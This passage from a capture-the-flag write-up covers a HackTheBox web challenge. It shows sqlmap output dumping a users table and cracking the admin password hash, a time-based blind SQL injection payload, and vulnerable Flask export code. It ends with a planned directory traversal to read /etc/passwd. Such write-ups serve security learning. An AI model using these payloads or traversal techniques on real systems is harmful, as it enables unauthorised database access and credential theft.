</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">table</span> <span class="s1">&#39;users&#39;</span> <span class="ow">in</span> <span class="n">database</span> <span class="s1">&#39;orbital&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;1692b753c031f2905b89e7258dbc49bb&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;admin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">47</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">recognized</span> <span class="n">possible</span> <span class="n">password</span> <span class="n">hashes</span> <span class="ow">in</span> <span class="n">column</span> <span class="s1">&#39;password&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">store</span> <span class="n">hashes</span> <span class="n">to</span> <span class="n">a</span> <span class="n">temporary</span> <span class="n">file</span> <span class="k">for</span> <span class="n">eventual</span> <span class="n">further</span> <span class="n">processing</span> <span class="n">with</span> <span class="n">other</span> <span class="n">tools</span> <span class="p">[</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">]</span> <span class="n">y</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">writing</span> <span class="n">hashes</span> <span class="n">to</span> <span class="n">a</span> <span class="n">temporary</span> <span class="n">file</span> <span class="s1">&#39;/tmp/sqlmapxmrfdr0m9619/sqlmaphashes-xvcfw_me.txt&#39;</span> 
</span></span><span class="line"><span class="cl"><span class="k">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">crack</span> <span class="n">them</span> <span class="n">via</span> <span class="n">a</span> <span class="n">dictionary</span><span class="o">-</span><span class="n">based</span> <span class="n">attack</span><span class="err">?</span> <span class="p">[</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="o">/</span><span class="n">q</span><span class="p">]</span> <span class="n">y</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">using</span> <span class="nb">hash</span> <span class="n">method</span> <span class="s1">&#39;md5_generic_passwd&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">what</span> <span class="n">dictionary</span> <span class="k">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">use</span><span class="err">?</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="n">default</span> <span class="n">dictionary</span> <span class="n">file</span> <span class="s1">&#39;/usr/share/sqlmap/data/txt/wordlist.tx_&#39;</span> <span class="p">(</span><span class="n">press</span> <span class="n">Enter</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="n">custom</span> <span class="n">dictionary</span> <span class="n">file</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="n">file</span> <span class="n">with</span> <span class="n">list</span> <span class="n">of</span> <span class="n">dictionary</span> <span class="n">files</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">17</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">using</span> <span class="n">default</span> <span class="n">dictionary</span>
</span></span><span class="line"><span class="cl"><span class="k">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">use</span> <span class="n">common</span> <span class="n">password</span> <span class="n">suffixes</span><span class="err">?</span> <span class="p">(</span><span class="n">slow</span><span class="o">!</span><span class="p">)</span> <span class="p">[</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">]</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">starting</span> <span class="n">dictionary</span><span class="o">-</span><span class="n">based</span> <span class="n">cracking</span> <span class="p">(</span><span class="n">md5_generic_passwd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">23</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">starting</span> <span class="mi">2</span> <span class="n">processes</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">33</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">cracked</span> <span class="n">password</span> <span class="s1">&#39;ichliebedich&#39;</span> <span class="k">for</span> <span class="n">user</span> <span class="s1">&#39;admin&#39;</span>                                                                                                                                                                        
</span></span><span class="line"><span class="cl"><span class="n">Database</span><span class="p">:</span> <span class="n">orbital</span>                                                                                                                                                                                                                         
</span></span><span class="line"><span class="cl"><span class="n">Table</span><span class="p">:</span> <span class="n">users</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">1</span> <span class="n">entry</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">+----+-------------------------------------------------+----------+</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">password</span>                                        <span class="o">|</span> <span class="n">username</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">+----+-------------------------------------------------+----------+</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="mi">1692</span><span class="n">b753c031f2905b89e7258dbc49bb</span> <span class="p">(</span><span class="n">ichliebedich</span><span class="p">)</span> <span class="o">|</span> <span class="n">admin</span>    <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">+----+-------------------------------------------------+----------+</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">table</span> <span class="s1">&#39;orbital.users&#39;</span> <span class="n">dumped</span> <span class="n">to</span> <span class="n">CSV</span> <span class="n">file</span> <span class="s1">&#39;/home/kali/.local/share/sqlmap/output/68.183.45.143/dump/orbital/users.csv&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">columns</span> <span class="k">for</span> <span class="n">table</span> <span class="s1">&#39;communication&#39;</span> <span class="ow">in</span> <span class="n">database</span> <span class="s1">&#39;orbital&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;id&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;int(11)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">55</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;source&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;varchar(255)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;destination&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;varchar(255)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;name&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;varchar(255)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">56</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;downloadable&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;varchar(255)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">table</span> <span class="s1">&#39;communication&#39;</span> <span class="ow">in</span> <span class="n">database</span> <span class="s1">&#39;orbital&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Arcturus&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;communication.mp3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Ice World Calling Red Giant&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Titan&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Vega&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;communication.mp3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;2&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Spiral Arm Salutations&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Andromeda&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Trappist-1&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">58</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;communication.mp3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">59</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">59</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Lone Star Linkup&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">59</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Proxima Centauri&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">59</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Kepler-438b&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">59</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;communication.mp3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;4&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Small World Symposium&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;TRAPPIST-1h&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Boop&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;communication.mp3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;5&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">00</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Jelly World Japes&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;Winky&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">Database</span><span class="p">:</span> <span class="n">orbital</span>
</span></span><span class="line"><span class="cl"><span class="n">Table</span><span class="p">:</span> <span class="n">communication</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">5</span> <span class="n">entries</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="o">+----+-----------------------------+------------------+-------------+-------------------+</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">id</span> <span class="o">|</span> <span class="n">name</span>                        <span class="o">|</span> <span class="n">source</span>           <span class="o">|</span> <span class="n">destination</span> <span class="o">|</span> <span class="n">downloadable</span>      <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">+----+-----------------------------+------------------+-------------+-------------------+</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">1</span>  <span class="o">|</span> <span class="n">Ice</span> <span class="ne">World</span> <span class="n">Calling</span> <span class="n">Red</span> <span class="n">Giant</span> <span class="o">|</span> <span class="n">Titan</span>            <span class="o">|</span> <span class="n">Arcturus</span>    <span class="o">|</span> <span class="n">communication</span><span class="o">.</span><span class="n">mp3</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">2</span>  <span class="o">|</span> <span class="n">Spiral</span> <span class="n">Arm</span> <span class="n">Salutations</span>      <span class="o">|</span> <span class="n">Andromeda</span>        <span class="o">|</span> <span class="n">Vega</span>        <span class="o">|</span> <span class="n">communication</span><span class="o">.</span><span class="n">mp3</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">3</span>  <span class="o">|</span> <span class="n">Lone</span> <span class="n">Star</span> <span class="n">Linkup</span>            <span class="o">|</span> <span class="n">Proxima</span> <span class="n">Centauri</span> <span class="o">|</span> <span class="n">Trappist</span><span class="o">-</span><span class="mi">1</span>  <span class="o">|</span> <span class="n">communication</span><span class="o">.</span><span class="n">mp3</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">4</span>  <span class="o">|</span> <span class="n">Small</span> <span class="ne">World</span> <span class="n">Symposium</span>       <span class="o">|</span> <span class="n">TRAPPIST</span><span class="o">-</span><span class="mi">1</span><span class="n">h</span>      <span class="o">|</span> <span class="n">Kepler</span><span class="o">-</span><span class="mi">438</span><span class="n">b</span> <span class="o">|</span> <span class="n">communication</span><span class="o">.</span><span class="n">mp3</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="mi">5</span>  <span class="o">|</span> <span class="n">Jelly</span> <span class="ne">World</span> <span class="n">Japes</span>           <span class="o">|</span> <span class="n">Winky</span>            <span class="o">|</span> <span class="n">Boop</span>        <span class="o">|</span> <span class="n">communication</span><span class="o">.</span><span class="n">mp3</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"><span class="o">+----+-----------------------------+------------------+-------------+-------------------+</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">table</span> <span class="s1">&#39;orbital.communication&#39;</span> <span class="n">dumped</span> <span class="n">to</span> <span class="n">CSV</span> <span class="n">file</span> <span class="s1">&#39;/home/kali/.local/share/sqlmap/output/68.183.45.143/dump/orbital/communication.csv&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">WARNING</span><span class="p">]</span> <span class="n">HTTP</span> <span class="n">error</span> <span class="n">codes</span> <span class="n">detected</span> <span class="n">during</span> <span class="n">run</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="mi">403</span> <span class="p">(</span><span class="n">Forbidden</span><span class="p">)</span> <span class="o">-</span> <span class="mi">913</span> <span class="n">times</span><span class="p">,</span> <span class="mi">500</span> <span class="p">(</span><span class="n">Internal</span> <span class="n">Server</span> <span class="n">Error</span><span class="p">)</span> <span class="o">-</span> <span class="mi">546</span> <span class="n">times</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">01</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetched</span> <span class="n">data</span> <span class="n">logged</span> <span class="n">to</span> <span class="n">text</span> <span class="n">files</span> <span class="n">under</span> <span class="s1">&#39;/home/kali/.local/share/sqlmap/output/68.183.45.143&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">ending</span> <span class="err">@</span> <span class="mi">19</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">01</span> <span class="o">/</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">20</span><span class="o">/</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Running sqlmap quickly picked up the proper payload to use for SQL injection. The payload utilized:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Payload</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span> <span class="n">AND</span> <span class="p">(</span><span class="n">SELECT</span> <span class="mi">4429</span> <span class="n">FROM</span> <span class="p">(</span><span class="n">SELECT</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span><span class="n">Llei</span><span class="p">)</span><span class="o">--</span> <span class="n">Mhzj</span><span class="s2">&#34;,&#34;</span><span class="n">password</span><span class="s2">&#34;:&#34;</span><span class="n">password</span><span class="s2">&#34;}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And fortunately with this, sqlmap is able to grab admin&rsquo;s password from the database. The login credentials are as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;ichliebedich&#34;}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Using these credentials gets us in.</p>
<p>Now that we are in, we can see a lot of static information on this page but no flag in plain sight. At the bottom of the page, we see an export option that will prompt us to download a <code>communication.mp3</code> file. We saw some information on an export page in the source code, so let&rsquo;s revisit this to get a better idea on what&rsquo;s going on.
In blueprints/test.py:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exportFile</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="o">.</span><span class="n">is_json</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Invalid JSON!&#39;</span><span class="p">),</span> <span class="mi">400</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">communicationName</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Everyone is saying I should escape specific characters in the filename. I don&#39;t know why.</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="n">f</span><span class="s1">&#39;/communications/{communicationName}&#39;</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="n">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">response</span><span class="p">(</span><span class="s1">&#39;Unable to retrieve the communication&#39;</span><span class="p">),</span> <span class="mi">400</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We see there is a lack of sanitization on how it is grabbing the file to export. If we can edit the file name we are requesting, we can perform directory traversal to grab any file that is not read-protected. To check this, we will look for the always-readable /etc/passwd.
In burpsuite:
Request</p>
<p><img src="/post/hackthebox_cyber_apocalypse_2023/Images/20230325194705.png"
	width="834"
	height="359"
	srcset="/post/hackthebox_cyber_apocalypse_2023/Images/20230325194705_hu16866355413064490036.png 480w, /post/hackthebox_cyber_apocalypse_2023/Images/20230325194705_hu8024410917089898236.png 1024w"
	loading="lazy"
	
		alt="image"
	
	
		class="gallery-image" 
